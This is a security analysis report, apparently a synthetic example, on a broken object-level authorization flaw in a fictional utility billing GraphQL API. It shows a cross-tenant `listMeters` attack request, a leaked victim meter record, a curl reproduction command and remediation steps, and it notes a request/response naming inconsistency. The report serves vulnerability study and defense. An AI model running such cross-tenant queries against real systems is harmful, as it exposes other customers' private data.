# Security Analysis Report
**System:** PowerGrid Customer Billing API
**Domain:** Energy / Utilities / Smart Grid
**Example ID:** GQL-0264
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 10.5 | Draft / non-published resource access on `getMeter` / `listMeters` — attacker lists meters belonging to another tenant |

---

## Finding 1 — BOLA: Draft/Non-Published Resource Access via Meter Resolver (Pattern 10.5)

### Summary
The GraphQL API at `https://api.powergrid-customer-b.example.com/graphql` exposes a `getMeter` resolver that fetches by `meterId` without verifying the JWT `tenantId` claim matches the object's `tenantId`. Per RISK-GQL-264, the Redis cache is keyed only by `meterId` (no user dimension), amplifying cross-user exposure. The HAR shows the attacker sending a `listMeters` query filtered by `tenantId: "tenant-777e"`; the server response returns data under the `getMeter` key (see inconsistency note below).

**Context.txt inconsistency (documented):** The HAR request (§6.0 request body) uses `listMeters(tenantId: "tenant-777e")`, while the HAR response (§6.0 response body) returns data under the key `getMeter`. These names conflict within context.txt. This analysis follows both artifacts faithfully.

**Note:** `x-request-id: req-271b777e` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 10.5 — Draft / non-published resource access
**Affected endpoint:** `POST https://api.powergrid-customer-b.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.powergrid-customer-b.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { listMeters(tenantId: \"tenant-777e\") { meterId ownerId data { sensitiveField } } }"}
```

**Response — Victim Meter Record**
```json
{
  "data": {
    "getMeter": {
      "tenantId": "tenant-777e",
      "ownerId": "other-user-271b777e",
      "data": {
        "sensitiveField": "CONFIDENTIAL-271b777e",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.powergrid-customer-b.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listMeters(tenantId: \"tenant-777e\") { meterId ownerId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-777e, sensitiveField: CONFIDENTIAL-271b777e
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim — reject any query where the client-supplied `tenantId` differs from the JWT claim.
2. Redis cache key must include user/tenant dimension: `meter:{tenantId}:{meterId}`.
3. Draft/unpublished billing records must be access-controlled by publication state + ownership.
